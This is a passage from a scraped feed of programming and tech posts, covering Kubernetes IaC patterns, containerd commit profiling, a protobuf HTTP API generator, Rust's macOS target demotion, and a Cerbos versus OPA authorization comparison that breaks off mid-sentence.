https://fortune.com/article/mark-zuckerberg-college-not-preparing-students-job-market-debt-burden/\">Mark Zuckerberg</a> on Theo Von’s <a href=\"https://www.youtube.com/watch?v=zbfOkhrgxH0\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"Go to https://www.youtube.com/watch?v=zbfOkhrgxH0\"> podcast</a> in April. “I think that there’s a big issue on that, and all the student debt issues are…really big.\n\n\n\n</p><p>“It’s sort of been this taboo thing to say, ‘Maybe not everyone needs to go to college,’ and because there’s a lot of jobs that don’t require that…people are probably coming around to that opinion a little more now than maybe like 10 years ago,” Zuckerberg added.</p><p>Moreover, OpenAI CEO <a href=\"https://fortune.com/2025/08/07/openai-launches-gpt-5-most-powerful-ai-model-llm-sam-altman-stargate/\" target=\"_self\" aria-label=\"Go to https://fortune.com/2025/08/07/openai-launches-gpt-5-most-powerful-ai-model-llm-sam-altman-stargate/\">Sam Altman said</a> that his company’s latest AI model can already perform in ways equivalent to those with a PhD.\n\n\n\n</p><p>“GPT-5 really feels like talking to a PhD-level expert in any topic,” Altman said earlier this month. “Something like GPT-5 would be pretty much unimaginable in any other time in history.”\n\n\n\n</p><h2>The pipeline from PhD to six-figure job offer remains strong—for now</h2><p>For existing AI-focused PhD students, the private sector jobs pipeline remains strong. In fact, in 2023, some 70% of all AI doctoral students took private sector jobs postgrad, a jump from just 20% two decades ago, according to <a href=\"https://mitsloan.mit.edu/ideas-made-to-matter/study-industry-now-dominates-ai-research\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"Go to https://mitsloan.mit.edu/ideas-made-to-matter/study-industry-now-dominates-ai-research\">MIT</a>.\n\n\n\n</p><p>However, this increase has some academic <a href=\"https://fortune.com/2025/06/25/ai-companies-court-ai-phds-with-huge-pay-packages-raising-fears-of-an-academic-brain-drain/\" target=\"_self\" aria-label=\"Go to https://fortune.com/2025/06/25/ai-companies-court-ai-phds-with-huge-pay-packages-raising-fears-of-an-academic-brain-drain/\">leaders worried about a “brain drain”</a> that could result from too many experts electing to work at tech companies—versus staying back and teaching the next generation as professors.\n\n\n\n</p><p>Henry Hoffmann, the chair of the University of Chicago’s department of computer science, recently <a href=\"https://fortune.com/2025/06/25/ai-companies-court-ai-phds-with-huge-pay-packages-raising-fears-of-an-academic-brain-drain/\" target=\"_self\" aria-label=\"Go to https://fortune.com/2025/06/25/ai-companies-court-ai-phds-with-huge-pay-packages-raising-fears-of-an-academic-brain-drain/\">told </a> that he’s seen his PhD students get courted for decades—but the salary lures have only grown. One student with zero professional experience recently dropped out to accept a “high six-figure” offer from <a href=\"https://fortune.com/2025/07/15/bytedance-tiktok-building-mixed-reality-headset-pico/\" target=\"_self\" aria-label=\"Go to https://fortune.com/2025/07/15/bytedance-tiktok-building-mixed-reality-headset-pico/\">ByteDance</a>.</p><p>“When students can get the kind of job they want [as students], there’s no reason to force them to keep going,” Hoffmann said.\n</p>","contentLength":3501,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mutcas/exgoogle_exec_says_degrees_in_law_and_medicine/"},{"title":"A Field Guide of K8s IaC Patterns","url":"https://www.reddit.com/r/kubernetes/comments/1murlb1/a_field_guide_of_k8s_iac_patterns/","date":1755629965,"author":"/u/ossinfra","guid":233500,"unread":true,"content":"<p>If you’ve poked around enough GitHub orgs or inherited enough infrastructure, you’ve probably noticed the same thing I have. There’s no single  way to do Infrastructure-as-Code (IaC) for Kubernetes. Best practices exist, but in the real world they tend to blur into a spectrum. You’ll find everything from beautifully organized setups to scripts held together with comments and good intentions. Each of these approaches reflects hard-won lessons—how teams navigate compliance needs, move fast without breaking things, or deal with whatever org chart they’re living under.</p><p>Over time, I started naming the patterns I kept running into, which are now documented in this <a href=\"https://docs.chkk.io/operations/iac-repo-patterns\">IaC Field Guide</a>.</p><p>I hope the K8s community on Reddit finds it useful. I am a Reddit newbie so feel free to provide feedback and I'll incorporate it into the Field Guide.</p><p> Giving things a name makes it easier to talk about them, both with teammates and with AI agents. When you name an IaC pattern, you don’t have to re-explain the tradeoffs every time. You can say  and people understand what you’re optimizing for. You don’t need a ten-slide deck.</p><p><strong>What patterns are most common:</strong> Some patterns show up over and over again. Forked Helm Chart, for example, is a favorite in highly regulated environments. It gives you an auditable, stable base, but you’re on the hook for handling upgrades manually.  keeps everything in plain YAML and is great for patching different environments without dealing with templating logic.  gives you a single place to understand the entire fleet, which makes onboarding easier. Of course, once that repo hits a certain size, it starts to slow you down.</p><p>There are plenty more worth knowing: , , , Programmatic IaC with tools like Pulumi or CDK,  that isolate each component, packaging infrastructure with Kubernetes Operators, and Crossplane Composition that abstracts cloud resources through CRDs. </p><p><strong>Picking a pattern for your team:</strong> Each of these IaC patterns is a balancing act. Forking a chart gives you stability but slows down upgrades. Using a polyrepo lets you assign fine-grained access controls, but you lose the convenience of atomic pull requests. Writing your IaC in a real programming language gives you reusable modules, but it’s no longer just YAML that everyone can follow. Once you start recognizing these tradeoffs, you can often see where a codebase is going to get brittle—before it becomes a late-night incident.</p><p><strong>Which patterns are best-suited for agentic LLM systems:</strong> And this brings us to where things are headed. AI is already moving beyond just making suggestions. We’re starting to see agents that open pull requests, refactor entire environments, or even manage deploys. In that world, unclear folder structures or vague naming conventions become real blockers. It’s not just about human readability anymore. A consistent layout, good metadata, and a clear naming scheme become tools that machines use to make safe decisions. Whether to fork a chart or just bump a version number can hinge on something as simple as a well-named directory.</p><p>The teams that start building with this mindset today will have a real edge. When automation is smart enough to do real work, your infrastructure needs to be legible not just to other engineers, but to the systems that will help you run it. That’s how you get to a world where your infrastructure fixes itself at 2am and nobody needs to do archaeology the next morning.</p>","contentLength":3451,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Hear me out ... Go + SvelteKit + Static Adapter ...","url":"https://www.reddit.com/r/golang/comments/1muqj97/hear_me_out_go_sveltekit_static_adapter/","date":1755627720,"author":"/u/Bl4ckBe4rIt","guid":233463,"unread":true,"content":"<p>Been seeing a lot of discussion about the \"perfect\" stack, but want a modern frontend DX without all the tinkering (so no HTMX, even though I like it). I think I've found the sweet spot.</p><p>The setup: </p><ul><li>You get the entire, amazing developer experience of SvelteKit (file-based routing,  functions, great tooling, hopefully the new  feature) without the operational complexity of running a separate Node.js server. </li><li>The final build is just a classic, client-rendered Single-Page App (SPA), simple static HTML, CSS, and JS files. </li><li>Your backend is just a pure API and a simple file server. You can even embed the entire frontend into a single Go binary for ridiculously easy deployment. </li></ul><p>It feels like the best of both worlds: a top-tier framework for development that produces a simple, robust, and decoupled architecture for production.</p>","contentLength":826,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"D2 (text-to-diagram) now supports ASCII output","url":"https://d2lang.com/blog/ascii/","date":1755627092,"author":"/u/terrastruct","guid":233479,"unread":true,"content":"<p>In the latest release of D2 (0.7.1), we introduce ASCII outputs.</p><p>Any output file with extension  will use the ASCII renderer to write to it.</p><p>Here is an example of their rendering from the <a href=\"https://github.com/terrastruct/d2-vim\" target=\"_blank\" rel=\"noopener noreferrer\">D2 Vim extension</a>. The user opens a  file and opens a preview window, which updates upon every save.</p><p>Perhaps the most useful place for ASCII diagrams is in the source code comments. Small\nsimple diagrams next to functions or classes can serve to be much clearer than describing\na flow.</p><p>Here again the Vim extension demonstrates a functionality to write some d2 code and\nreplace the selection with the ASCII render.</p><h2>Unicode and standard ASCII<a href=\"https://d2lang.com/blog/ascii/#unicode-and-standard-ascii\" aria-label=\"Direct link to Unicode and standard ASCII\" title=\"Direct link to Unicode and standard ASCII\">​</a></h2><p>The default character set of ASCII renders is unicode, which has nicer box-drawing\ncharacters. If you'd like true ASCII for maximum portability, you can specify this with\nthe flag .</p><div><div><p>Note that the ASCII renderer should be considered in alpha stage. There will be many\ncorner cases, areas of improvements, and outright bugs. If you enjoy using it, we'd\nappreciate you taking the time to file any issues you run into:\n<a href=\"https://github.com/terrastruct/d2/issues\" target=\"_blank\" rel=\"noopener noreferrer\">https://github.com/terrastruct/d2/issues</a>.</p></div></div><p>The ASCII renderer is a downscale of the layout determined by the ELK layout engine with\nsome post-processing to further compact it.</p><ul><li>No styles are supported<ul><li>Some will never be, e.g.  and  don't make sense in ASCII.</li><li>Some may in the future with limited scope, e.g. colors when rendered to terminal.<ul><li>By extension, themes are moot</li></ul></li><li>Some should be considered TODOs, e.g.  and </li></ul></li><li>Uneven spacing<ul><li>Sometimes the downscaling results in a box with uneven spacing, e.g. a rectangle with\nwidth 5 and the label is 2 chars. Due to discrete coordinate space in ASCII renders, some\noutputs may look less even than their SVG counterparts.</li></ul></li><li>Certain things just can't render<ul><li>Special text, e.g. Markdown, Latex, Code</li><li>UML classes and SQL tables</li><li>Right now these aren't special-handled -- whether removing them from the diagram or\nusing some placeholder is the right choice is tbd.</li></ul></li><li>Not all shapes are supported<ul><li>Here's what all the shapes render as in ASCII. Some of these, like cloud and circle,\nhave curves that don't translate well to ASCII. We render these as a rectangle and add\na little icon for what it's supposed to represent in the top-left. These are subject to\nchange. For now we recommend rendering without custom shapes.</li></ul></li></ul><p>This is live now in the D2 Playground. Try opening the below code block (click top right\nof it).</p>","contentLength":2368,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1muq8o4/d2_texttodiagram_now_supports_ascii_output/"},{"title":"[R] azzurra-voice, a new State-of-the-Art Italian Text-to-Speech model","url":"https://www.reddit.com/r/MachineLearning/comments/1munwmw/r_azzurravoice_a_new_stateoftheart_italian/","date":1755622100,"author":"/u/poppear","guid":233439,"unread":true,"content":"<p>We're Cartesia, a small AI research lab based in Italy. We believe the future of AI shouldn't just be about processing commands, but about creating genuine connection. Our vision is to build agents that are private, personal, and feel culturally present.</p><p>Today, we're excited to share the first step with the open-source community: .</p><p> is a highly expressive and natural-sounding Text-to-Speech (TTS) model for the Italian language, trained on tens of thousands of hours of high-quality, diverse Italian speech. We worked hard to capture the accents, intonations, and real-life conversational patterns from across Italy to avoid that robotic, monotone sound.</p><p><strong>You can listen to audio samples comparing</strong><strong>to other open models on our</strong><a href=\"https://blog.cartesia.one/posts/introducing-azzurra-voice/\"></a></p>","contentLength":723,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Dependabot now supports Rust toolchain updates - GitHub Changelog","url":"https://github.blog/changelog/2025-08-19-dependabot-now-supports-rust-toolchain-updates/","date":1755620403,"author":"/u/Jammie1","guid":233608,"unread":true,"content":"<h2>Subscribe to our developer newsletter</h2><p>\n\t\t\t\tDiscover tips, technical guides, and best practices in our biweekly newsletter just for devs.\t\t\t</p>","contentLength":138,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mun4a3/dependabot_now_supports_rust_toolchain_updates/"},{"title":"CRLite: Fast, private, and comprehensive certificate revocation checking in","url":"https://hacks.mozilla.org/2025/08/crlite-fast-private-and-comprehensive-certificate-revocation-checking-in-firefox/","date":1755620156,"author":"/u/feross","guid":233462,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mun09l/crlite_fast_private_and_comprehensive_certificate/"},{"title":"Demoting x86_64-apple-darwin to Tier 2 with host tools | Rust Blog","url":"https://blog.rust-lang.org/2025/08/19/demoting-x86-64-apple-darwin-to-tier-2-with-host-tools/","date":1755617918,"author":"/u/PthariensFlame","guid":233408,"unread":true,"content":"<p>In Rust 1.90.0, the target  will be demoted to Tier 2 with host tools.\nThe standard library and the compiler will continue to be built and distributed,\nbut automated tests of these components are no longer guaranteed to be run.</p><p>Rust has supported macOS for a long time,\nwith some amount of support dating back to Rust 0.1 and likely before that.\nDuring that time period,\nApple has changed CPU architectures from x86 to x86_64 and now to Apple silicon,\nultimately announcing the <a href=\"https://en.wikipedia.org/wiki/Mac_transition_to_Apple_silicon#Timeline\">end of support</a> for the x86_64 architecture.</p><p>Similarly,\n<a href=\"https://github.blog/changelog/2025-07-11-upcoming-changes-to-macos-hosted-runners-macos-latest-migration-and-xcode-support-policy-updates/#macos-13-is-closing-down\">GitHub has announced</a> that they will no longer provide free macOS x86_64 runners for public repositories.\nThe Rust Project uses these runners to execute automated tests for the  target.\nSince the <a href=\"https://doc.rust-lang.org/stable/rustc/target-tier-policy.html\">target tier policy</a> requires that Tier 1 platforms must run tests in CI,\nthe  target must be demoted to Tier 2.</p><p>Starting with Rust 1.90.0,  will be Tier 2 with host tools.\nFor users,\nnothing will change immediately;\nbuilds of both the standard library and the compiler will still be distributed by the Rust Project for use via  or alternative installation methods.</p><p>Over time,\nthis target will likely accumulate bugs faster due to reduced testing.</p><p>If the  target causes concrete problems,\nit may be demoted further.\nNo plans for further demotion have been made yet.</p><p>For more details on the motivation of the demotion, see <a href=\"https://rust-lang.github.io/rfcs/3841-demote-x86_64-apple-darwin.html\">RFC 3841</a>.</p>","contentLength":1351,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mulyk1/demoting_x86_64appledarwin_to_tier_2_with_host/"},{"title":"Profiling containerd’s diff path: why O(n²) hurt us and how OverlayFS saved the day","url":"https://www.reddit.com/r/kubernetes/comments/1mullm3/profiling_containerds_diff_path_why_on%C2%B2_hurt_us/","date":1755617144,"author":"/u/cloud-native-yang","guid":233380,"unread":true,"content":"<p>When container commits start taking coffee-break time, your platform’s core workflows quietly fall apart. I spent the last months digging into commit/export slowness in a large, multi-tenant dev environment that runs on Docker/containerd, and I thought the <a href=\"https://www.reddit.com/r/kubernetes\">r/kubernetes</a> crowd might appreciate the gory details and trade-offs.</p><p>Personal context: I work on a cloud dev environment product (Sealos DevBox). We hit a wall as usage scaled: committing a 10GB environment often took 10+ minutes, and even “add 1KB, then commit” took tens of seconds. I wrote a much longer internal write-up and wanted to bring the useful parts here without links or marketing. I’m sharing from an engineer’s perspective; no sales intent.</p><p>Key insights and what actually moved the needle</p><ul><li>The baseline pain: Generic double-walk diffs can go O(n²). Our profiling showed containerd’s diff path comparing full directory trees from the lowerdir (base image) and the merged view. That meant re-checking millions of unchanged inodes, metadata, and sometimes content. With 10GB images and many files, even tiny changes paid a huge constant cost.</li><li>OverlayFS already has the diff, if you use it: In OverlayFS, upperdir contains exactly what changed (new files, modified files, and whiteouts for deletions). Instead of diffing “everything vs everything,” we shifted to reading upperdir as the ground truth for changes. Complexity goes from “walk the world” to “walk what actually changed,” i.e., O(m) where m is small in typical dev workflows.</li><li>How we wired it: We implemented an OverlayFS-aware diff path that: <ul><li>Mounts lowerdir read-only.</li><li>Streams changes by scanning upperdir (including whiteouts).</li><li>Assembles the tar/layer using only those entries.</li><li>This approach maps cleanly to continuity-style DiffDirChanges with an OverlayFS source, and we guarded it behind config so we can fall back when needed (non-OverlayFS filesystems, different snapshotters, etc.).</li></ul></li><li>Measured results (lab and prod): In controlled tests, “10GB commit” dropped from ~847s to ~267s, and “add 1KB then commit” dropped from ~39s to ~0.46s. In production, p99 commit latency fell from roughly 900s to ~180s, CPU during commit dropped significantly, and user complaints vanished. The small-change path is where the biggest wins show up; for large-change sets, compression begins to dominate.</li><li>What didn’t work and why: <ul><li>Tuning the generic walker (e.g., timestamp-only checks, larger buffers) gave marginal gains but didn’t fix the fundamental scaling problem.</li><li>Aggressive caching of previous walks risked correctness with whiteouts/renames and complicated invalidation.</li><li>Filesystem-agnostic tricks that avoid reading upperdir semantics missed OverlayFS features (like whiteout handling) and produced correctness issues on deletes.</li><li>Switching filesystems wasn’t feasible mid-flight at our scale; this had operational risk and unclear gains versus making OverlayFS work with us.</li></ul></li></ul><p>A tiny checklist if your commits/exports are slow</p><ul><li>Verify the snapshotter and mount layout: <ul><li>Confirm you’re on OverlayFS and identify lowerdir, upperdir, and merged paths for a sample container.</li><li>Inspect upperdir to see whether it reflects your actual changes and whiteouts.</li></ul></li><li>Reproduce with two tests: <ul><li>Large change set: generate many MB/GB across many files; measure commit time and CPU.</li><li>Tiny delta: add a single small file; if this is still slow, your diff path likely walks too much.</li></ul></li><li>Profile the hot path: <ul><li>Capture CPU profiles during commit; look for directory tree walks and metadata comparisons vs compression.</li></ul></li><li>Separate diff vs compression: <ul><li>If small changes are slow, it’s likely the diff. If big changes are slow but tiny changes are fast, compression/tar may dominate.</li></ul></li><li>Guardrails: <ul><li>Keep a fallback to the generic walker for non-OverlayFS cases.</li><li>Validate whiteout semantics end-to-end to avoid delete correctness bugs.</li></ul></li></ul><p>Minimal example to pressure-test your path</p><ul><li>Create 100 files of 100MB each (or similar) inside a container, commit, record time.</li><li>Then add a single 1KB file and re-commit.</li><li>If both runs are similarly slow, you’re paying a fixed cost unrelated to the size of the delta, which suggests tree-walking rather than change-walking.</li></ul><p>A lightweight decision guide</p><ul><li>Are you on OverlayFS? <ul><li>Yes → Prefer an upperdir-driven diff. Validate whiteouts and permissions mapping.</li><li>No → Consider snapshotter-specific paths; if unavailable, the generic walker may be your only option.</li></ul></li><li>After switching to upperdir-based diffs, is compression now dominant? <ul><li>Yes → Consider parallel compression or alternative codecs; measure on real payloads.</li><li>No → Re-check directory traversal, symlink handling, and any unexpected I/O in the diff path.</li></ul></li><li>Do you have many small files? <ul><li>Yes → Focus on syscall counts, directory entry reads, and tar header overhead.</li></ul></li></ul><ul><li>For those running large multi-tenant setups, how have you balanced correctness vs performance in diff generation, especially around whiteouts and renames?</li><li>Anyone using alternative snapshotters or filesystems in production for faster commits? What trade-offs did you encounter operationally?</li></ul><p>TL;DR - We cut commit times by reading OverlayFS upperdir directly instead of double-walking entire trees. Small deltas dropped from tens of seconds to sub-second. When diffs stop dominating, compression typically becomes the next bottleneck.</p>","contentLength":5289,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"RPGsh: A terminal application for managing TTRPGs","url":"https://github.com/TheMohawkNinja/rpgsh","date":1755612978,"author":"/u/TheMohawkNinja","guid":233440,"unread":true,"content":"<p>Not sure if anyone will find this remotely interesting, but I have been developing a terminal application for managing games like D&amp;D, Pathfinder, etc. (theoretically, any TTRPG can be plugged in to work with this system)</p><p>I got tired of constantly editing a PDF document and having to remember to modify the various character attributes whenever my Strength or Constitution or whatever increases. Figured since I was already doing most of my gaming sessions over the Internet anyways because my party members are all scattered across the continental U.S., I'd just write my own program to do all of that for me.</p><p>I'm sure it's full of bugs since I haven't really had a chance to use it \"in production\" as it were, but I at least bothered to write some documentation for the program and help text for all of the commands.</p>","contentLength":817,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mujoyd/rpgsh_a_terminal_application_for_managing_ttrpgs/"},{"title":"Without the futex, it's futile","url":"https://www.reddit.com/r/programming/comments/1muj8qb/without_the_futex_its_futile/","date":1755611978,"author":"/u/eatonphil","guid":233383,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/eatonphil\"> /u/eatonphil </a> <br/> <span><a href=\"https://h4x0r.org/futex/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1muj8qb/without_the_futex_its_futile/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Happy birthday #DebianDay!","url":"https://www.reddit.com/r/linux/comments/1muiwl3/happy_birthday_debianday/","date":1755611184,"author":"/u/revomatrix","guid":233385,"unread":true,"content":"<p>Happy 32nd birthday to Debian, one of the oldest operating systems based on the #LinuxKernel, and the basis for #Ubuntu, #Kali, and #LinuxMint! 🐧🎈🎂</p><p>Thank you, #Debian community, for all your amazing work!</p><p>Ubuntu #FOSS #opensource #freesoftware #LPI</p>","contentLength":255,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Would this work as a Linux based server system","url":"https://www.reddit.com/r/linux/comments/1muikp7/would_this_work_as_a_linux_based_server_system/","date":1755610404,"author":"/u/Fennec7013","guid":233361,"unread":true,"content":"<div><p>So I just have this laptop sitting around because it’s old and barely usable at least with win10 so would convert to Linux help that issue </p><p>Also the reason I want a server is that I’m experimenting with C++ and have already started trying to understand how to tools such as raylib, GML, and Bullet because I’m interested in making server based online games and hubs</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Fennec7013\"> /u/Fennec7013 </a>","contentLength":403,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Language Models as Thespians","url":"https://www.reddit.com/r/programming/comments/1muhyru/language_models_as_thespians/","date":1755608944,"author":"/u/js4845","guid":234468,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/js4845\"> /u/js4845 </a> <br/> <span><a href=\"https://jstrieb.github.io/posts/llm-thespians/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1muhyru/language_models_as_thespians/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kerbernetes: Kerberos + LDAP auth for Kubernetes","url":"https://www.reddit.com/r/kubernetes/comments/1muhr1b/kerbernetes_kerberos_ldap_auth_for_kubernetes/","date":1755608439,"author":"/u/MrFr0z01","guid":233335,"unread":true,"content":"<p>Hey everyone, I’ve been working on a small auth service for Kubernetes that plugs into Kerberos and LDAP.</p><p>The idea is pretty simple: instead of managing Kubernetes users manually or relying only on OIDC, Kerbernetes lets you:</p><ul><li>Authenticate users via Kerberos (SPNEGO)</li><li>Integrate with LDAP to map groups</li><li>Automatically reconcile RoleBindings and ClusterRoleBindings</li></ul><p>It can be especially handy in environments without a web browser or when accessing a VM via SSH with ticket forwarding.</p><p>You can deploy it using helm.</p><p>I’d love to hear how people are handling enterprise auth in K8s, and if you see places Kerbernetes could help.</p><p>Your feedbacks are welcomes !</p>","contentLength":648,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Sebuf: Build HTTP APIs from Protobuf Definitions with Automatic Validation and OpenAPI Docs (And more)","url":"https://www.reddit.com/r/golang/comments/1muhg5e/sebuf_build_http_apis_from_protobuf_definitions/","date":1755607660,"author":"/u/Flat_Assignment_4180","guid":233339,"unread":true,"content":"<p>Hey Gophers! I love protocol buffers for their amazing tooling and descriptive power, but gRPC isn't always available (especially for web/mobile clients).</p><p>Existing solutions like <a href=\"https://github.com/grpc-ecosystem/grpc-gateway\">grpc-gateway</a> and <a href=\"https://connectrpc.com/\">Connect RPC</a> are great, but they either require gRPC dependencies or have their own trade-offs. So I built Sebuf, a slightly opinionated way to get pure HTTP APIs from protobuf definitions (in both JSON or binary)</p><ul><li> Pure HTTP handlers from protobuf</li><li> Auto-generated docs with examples, required headers, tags</li><li> Using buf.validate annotations</li><li><strong>Helper functions for oneofs:</strong> No more nested struct boilerplate</li></ul><p>POST-only endpoints because that's closest to RPC semantics (we're calling methods, not doing REST).</p><pre><code>service UserService { option (sebuf.http.service_config) = { base_path: \"/api/v1\" }; option (sebuf.http.service_headers) = { required_headers: [{ name: \"X-API-Key\" required: true example: \"123e4567-e89b-12d3-a456-426614174000\" }] }; rpc Login(LoginRequest) returns (LoginResponse) { option (sebuf.http.config) = { path: \"/auth/login\" }; } } message LoginRequest { oneof auth_method { EmailAuth email = 1; TokenAuth token = 2; SocialAuth social = 3; } } message EmailAuth { string email = 1 [(buf.validate.field).string.email = true]; string password = 2 [(buf.validate.field).string.min_len = 8]; } </code></pre><pre><code>// Register HTTP handlers (validation happens automatically) api.RegisterUserServiceServer(service, api.WithMux(mux)) // Or use the mock that respects your proto examples mockService := api.NewMockUserServiceServer() // Some helpers: instead of building nested oneOfs structs manually: req := api.NewLoginRequestEmail(\"user@example.com\", \"password\") req := api.NewLoginRequestToken(\"auth-token\") </code></pre><p>Plus OpenAPI docs with all your examples, headers, and validation rules baked in.</p><p>This is a WIP, needs more tweaking and testing, but it's solving real problems I'm having at my $DAY_JOB (where we've already integrated sebuf into our backend). Would love feedback and ideas for features you think would be cool to have! I honestly think we can build amazing little helpers to make our lives easier when it comes to working with protobufs.</p><p>Yes, a lot of AI (Claude) was used to write the code, but everything is meticulously planned out to solve actual pain points I face building HTTP APIs from protobuf definitions.</p><p><strong>The API will not be stable until v1.0.0</strong> - expect breaking changes as we iterate based on feedback.</p><ul><li>Much more extensive testing coverage</li><li>Full OpenAPI v3.1 feature support</li><li>Better error handling (custom errors per method and per service)</li></ul><p>Would love to hear from anyone else who needs HTTP APIs from protobuf but wants to keep things simple!</p>","contentLength":2633,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Cerbos vs OPA: comparing policy language, developer experience, performance, and scalability (useful if you are evaluating authorization for Kubernetes)","url":"https://www.cerbos.dev/blog/cerbos-vs-opa","date":1755607199,"author":"/u/West-Chard-1474","guid":233309,"unread":true,"content":"<p>Externalized authorization is quickly becoming a core part of enterprise architecture. At IAM conferences and in conversations with engineering teams, we’ve seen growing interest in policy engines. It’s a great sign that the industry is maturing and looking for scalable, secure ways to manage access.</p><p>Both Open Policy Agent (OPA) and <a href=\"https://www.cerbos.dev/\">Cerbos</a> are open-source policy engines, that help teams externalize authorization logic from application code, but they take very different approaches. OPA is a general-purpose policy engine used for a wide variety of policy decisions, predominantly in the infrastructure layer (eg. Kubernetes) and more recently as well as in the application layer. Cerbos is a purpose-built authorization engine for application- and API-level access control, focused on simplifying fine-grained permissions.</p><p>When we built the first version of Cerbos, we <a href=\"https://www.cerbos.dev/blog/from-opa-to-our-own-engine-cerbos\">began with OPA</a> as the underlying decision engine. It was a great starting point, but as our needs evolved and as we saw what developers truly needed, we hit limitations that led us to build our own custom decision engine optimized for authorization checks. That transition became a foundational part of our product evolution and shaped how Cerbos works today.</p><p>In this article, we will break down the differences between Cerbos and OPA across policy language, developer experience, architecture, performance, and policy management. We will also show the strengths and limitations of each solution and discuss practical trade-offs.</p><p>Cerbos policies are defined in a  (or JSON) that will feel familiar to most developers. Rather than requiring a new programming language, Cerbos leverages YAML schemas to express authorization rules, with concepts for principals (users), resources, roles, and actions.</p><p>This human-readable policy-as-code approach makes it easy to write and review access rules. For any <a href=\"https://docs.cerbos.dev/cerbos/latest/tutorial/05_adding-conditions.html#:~:text=Conditions%20in%20Cerbos%20are%20written,about%20the%20resource%20being%20accessed\">conditional</a> logic, Cerbos uses Google’s <strong>Common Expression Language (CEL)</strong> inside the YAML policies.</p><ul><li>CEL expressions allow defining boolean conditions (e.g., ensuring the resource's owner matches the requesting user) in a concise, readable way.</li><li>Because policies are essentially configurations, they can be version-controlled and edited without deep programming knowledge.</li></ul><p>Design of the Cerbos policy language prioritizes simplicity. A typical Cerbos rule might say that users with role X can perform action Y on resource Z, optionally adding a CEL condition for context-specific checks (such as time of day, resource ownership, or value of a field).</p><p>This constrained language model covers common RBAC/ABAC/PBAC needs without forcing developers to learn a new syntax. The trade-off is that Cerbos’s policy language is less free-form than a general programming language - it is optimized for access control use cases.</p><p>In practice, this means most authorization requirements can be captured with straightforward YAML definitions, and developers are not bogged down by complex syntax. Cerbos’s use of YAML + CEL offers a gentle learning curve for policy authors while supporting complex rules when needed.</p><p>OPA uses a <strong>domain-specific language called Rego</strong> for writing policies. Rego is a declarative logic programming language inspired by Datalog, which allows teams to express policies as rules that derive a decision from given inputs.</p><p>This approach allows developers to represent arbitrary conditions, iterate over data, and enforce complex logic using Rego. However, this flexibility comes with a steep learning curve.</p><ul><li>Rego’s syntax and paradigms are not commonly used in everyday application development, so teams often need significant training to become proficient.</li><li>Writing an OPA policy means writing code (textual rules) in Rego, which many developers find difficult to learn if they’re unfamiliar with declarative logic languages.</li></ul><p>In Rego, policies are written as rules that evaluate to allow/deny decisions or other structured outputs. Because OPA is not tied to a specific domain, like user permissions, the policy author must define the schema and structure of inputs (e.g. what “user” or “resource” means in context). This gives OPA versatility - it can be used for anything from access control to pod security policies - but it also means there is <strong>no built-in high-level abstraction for common authZ scenarios</strong>.</p><p>Everything is expressed in terms of Rego rules over JSON data. In summary, OPA’s Rego provides great expressiveness for policy logic at the cost of greater complexity. It’s a declarative query language that may feel heavyweight for teams that only need role/attribute-based access rules.</p><p>The learning curve and unfamiliar syntax remain key considerations when adopting OPA’s policy language.</p><p>Before building Cerbos, we spoke with developers, IAM leads, and security teams to understand their needs. Cerbos was designed with those insights in mind, aiming to make integration and policy management as straightforward as possible.</p><p><strong>The developer experience focus is a core part of Cerbos’s philosophy:</strong></p><ul><li><p>Cerbos offers  in multiple languages (Go, Java, Node.js, .NET, Python, and others) so that developers can check permissions with a single function call in their code. For example, using the Cerbos SDK, a developer might call a method like <code>isAllowed(principal, resource, action)</code> and get an allow/deny decision without worrying about the underlying logic.</p></li><li><p>This high-level API (specifying  is doing  on ) abstracts away the complexity of policy evaluation. It means developers do not need to interact with the policy engine at a low level; they can rely on Cerbos to handle policy enforcement, scaling, and even logging behind the scenes.</p></li></ul><p>Beyond the API, Cerbos provides tooling that fits with development workflows.</p><ul><li>Policies, being YAML files, can be edited in any IDE and kept in source control alongside application code.</li><li>Cerbos supports IDEs for code completion and syntax checking when writing policies.</li><li>Cerbos offers a CLI and testing utilities to validate policies, has a unit testing framework that allows users to do full matrix testing, as well as an interactive policy editing UI - the <a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/cerbos-playground\">Cerbos Playground</a>, for collaboration.</li></ul><p>When running Cerbos, it automatically generates <strong>detailed decision logs and explanations</strong> for each authorization check. This means that if a request is denied, developers or DevOps teams can inspect the Cerbos <a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/audit-logs\">audit logs</a> to see exactly which rule caused the denial and why, greatly simplifying debugging of permission issues.</p><p>Cerbos offers a developer-friendly experience by providing easy integration, familiar policy syntax, and built-in support for testing and troubleshooting. We’re proud of how far the developer experience has come, and we’re continuously improving 